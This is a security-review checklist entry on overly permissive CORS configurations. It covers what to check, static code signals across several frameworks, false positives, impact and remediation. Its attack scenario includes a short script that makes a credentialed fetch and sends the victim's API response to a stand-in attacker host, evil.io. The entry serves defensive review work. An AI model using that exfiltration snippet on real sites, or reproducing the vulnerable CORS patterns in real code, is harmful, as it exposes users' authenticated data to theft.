---
id: P104
name: CORSOverPermissive
area: V13 Configuration
refs: ASVS V14.x / WSTG-CLNT-07 / CS: Cross Origin Resource Sharing
---

# P104 — CORSOverPermissive

## Overview
Cross-Origin Resource Sharing (CORS) is a browser-enforced relaxation of the Same-Origin Policy (SOP) that lets a server declare which foreign origins may read its responses. A misconfigured policy — reflecting any request `Origin` header back, sending `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`, or whitelisting overly broad wildcard patterns — effectively abandons SOP for authenticated endpoints. The root cause is almost always developer intent to "make CORS work" without realizing that credentials (cookies, `Authorization` headers, TLS client certs) ride along automatically with cross-site `fetch`/XHR when the browser sees a permissive response. The result: any malicious website can issue authenticated requests to the victim API and read the responses, turning a same-site CSRF-like capability into full cross-origin data exfiltration.

## What to check
- Is the response `Access-Control-Allow-Origin` set to `*` **while** `Access-Control-Allow-Credentials: true` is also present? (Browsers reject this combo, but the *intent* signals a broken mental model — and a hand-rolled header writer may still emit a reflected origin + credentials, which IS exploitable.)
- Does the server **reflect** the request `Origin` header verbatim into `Access-Control-Allow-Origin` without checking it against an allow-list? This is the most common live vulnerability (`origin: true`, `Access-Control-Allow-Origin: ${req.headers.origin}`).
- Are credentials allowed (`credentials: true` / `Access-Control-Allow-Credentials: true`) on any non-public endpoint? Combined with reflection or a broad whitelist, this is directly exploitable.
- Is the allow-list logic flawed? Common bugs: substring match (`origin.endsWith('example.com')` matches `evil-example.com`), regex anchoring (`/example\.com/` without `^`/`$`), or `*.example.com` handled by prefix rather than proper suffix+dot check (`evil.example.com.attacker.io`).
- Is the preflight (`OPTIONS`) cache TTL (`Access-Control-Max-Age`) set very high, pinning a permissive policy in the browser?
- Are all methods (`*`) and all headers (`*`) permitted, broadening the attack surface for authenticated operations?
- Does the CORS middleware apply **globally** (e.g. `app.use(cors(...))` before auth) when only a few public routes actually need cross-origin access?
- Are wildcard origins used on endpoints that carry sensitive data in the body even without cookies (e.g. token in URL or readable by an authenticated SPA)?

## Static signals
Node / Express (`cors` package and hand-rolled):
- `cors({ origin: '*', credentials: true })` — invalid+dangerous combination
- `cors({ origin: true })` — reflects the request Origin unconditionally
- `app.use(cors())` with no options, then `app.use(session(...))` / cookies applied globally
- `res.set('Access-Control-Allow-Origin', req.headers.origin)` or `` res.set('Access-Control-Allow-Origin', `*`) `` with `Allow-Credentials: true`
- `origin: '*'` on a route that also reads `req.cookies` / `req.headers.authorization`

Flawed allow-list logic:
- `origin.endsWith(domain)` / `origin.includes(domain)` (substring, not anchored)
- `if (allowedDomains.includes(origin))` where `allowedDomains` contains wildcards like `*.example.com` treated as literal strings
- Regex without anchors: `/example\.com/` (matches `example.com.evil.io`)
- `new RegExp(domain.replace('*', '.*'))` style wildcard expansion

Python (Flask / Django / FastAPI):
- Flask: `@app.after_request` setting `Access-Control-Allow-Origin: *` with `Supports-Credentials` in Flask-CORS `CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)`
- Django: `CORS_ALLOW_ALL_ORIGINS = True` with `CORS_ALLOW_CREDENTIALS = True` (django-cors-headers)
- FastAPI / Starlette `CORSMiddleware(allow_origins=["*"], allow_credentials=True)`

Java / Spring:
- `@CrossOrigin(origins = "*", allowCredentials = "true")` on a controller
- `WebMvcConfigurer` / `addCorsMappings().allowedOrigins("*").allowCredentials(true)`
- `response.setHeader("Access-Control-Allow-Origin", request.getHeader("Origin"))`

Go:
- `handlers.CORS(handlers.AllowedOrigins([]string{"*"}), handlers.AllowCredentials())` (gorilla)
- Hand-rolled: `w.Header().Set("Access-Control-Allow-Origin", "*")` next to `Allow-Credentials: true` or `r.Header.Get("Origin")` reflection

PHP / Ruby / .NET:
- PHP: `header("Access-Control-Allow-Origin: *");` with `header("Access-Control-Allow-Credentials: true");` or `$_SERVER['HTTP_ORIGIN']` reflection
- Rails: `config.middleware.insert_before Rack::Cors` with `origins '*'` and `credentials: true` in `rack-cors`
- ASP.NET: `app.UseCors(b => b.AllowAnyOrigin().AllowCredentials())` (note: `AllowAnyOrigin` + `AllowCredentials` throws at runtime; the dangerous variant is `SetIsOriginAllowed(_ => true).AllowCredentials()`)

## False positives
- A **public, read-only, unauthenticated** API returns `Access-Control-Allow-Origin: *` with **no** `Allow-Credentials` header and no cookie/auth dependency. This is the legitimate use of wildcard CORS and is safe.
- The allow-list is a strict exact-match array of fully-qualified origins (`['https://app.example.com']`) and credentials are only enabled when the request origin matches — this is the correct pattern.
- The `Origin` reflection only happens for a known-safe set of origins via a function that performs an anchored, dot-aware suffix check.
- CORS policy is scoped to a single public route (e.g. `/health`, static assets) and authenticated routes have no CORS headers.
- The endpoint requires a custom request header that cannot be set cross-site without a preflight, and the preflight (`OPTIONS`) handler rejects untrusted origins — though this alone is weak; verify the actual response headers.
- Note: SOP/CORS is a **browser** control; native mobile apps and server-to-server calls ignore it. Do not rate a CORS misconfiguration as exploitable from non-browser clients — the risk is cross-origin browser abuse of authenticated sessions.

## Attack scenario
1. The target API at `https://api.example.com/me` reflects the `Origin` header and sends `Access-Control-Allow-Credentials: true`, while authenticating via a session cookie.
2. Attacker hosts `https://evil.io/grab.html` containing:
   ```html
   <script>
   fetch('https://api.example.com/me', { credentials: 'include' })
     .then(r => r.text())
     .then(d => fetch('https://evil.io/log?d=' + encodeURIComponent(d)));
   </script>
   ```
3. A logged-in victim visits `evil.io`. The browser attaches the victim's `api.example.com` session cookie to the cross-origin request.
4. Because the API reflected `https://evil.io` as the allowed origin **with credentials**, the browser exposes the response body to the attacker's script.
5. The attacker reads the victim's profile, PII, API keys, or account data — and can repeat the call for any other authenticated endpoint (settings, messages, payments) since SOP no longer blocks reads.

## Impact
- **Confidentiality**: full read of authenticated API responses — PII, messages, account data, tokens returned in bodies. This is the distinguishing harm versus CSRF, which cannot read responses.
- **Integrity**: the attacker can also issue state-changing requests (PUT/POST/DELETE) in the victim's session if those methods are permitted and CSRF defenses are absent or bypassed (CORS reflection effectively defeats any origin-based CSRF check).
- **Availability**: limited direct impact, but token/account lockout or destructive mutations are possible via permitted write methods.
- Severity scales with the breadth of authenticated endpoints behind the permissive policy and the victim's privilege level — an admin-facing API with reflected-origin + credentials is full account/admin compromise.

## Remediation
Use a strict exact-match allow-list of origins, and enable credentials only when needed:
```ts
// VULNERABLE — reflects any origin with credentials
app.use(cors({ origin: true, credentials: true }));

// SAFE — explicit allow-list, credentials only for trusted origins
const ALLOWED = new Set(['https://app.example.com', 'https://admin.example.com']);
app.use(cors({
  origin: (origin, cb) => cb(null, ALLOWED.has(origin || '')),
  credentials: true,
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 600,
}));
```
For unauthenticated public data, prefer `origin: '*'` with **no** credentials. Always perform an anchored, dot-aware origin check (never `endsWith`/`includes`/unanchored regex). Combine with CSRF tokens and a restrictive `Content-Security-Policy` as defense-in-depth — never rely on CORS alone to gate authenticated mutations.

## References
- ASVS V14.x
- WSTG-CLNT-07
- CS: Cross Origin Resource Sharing
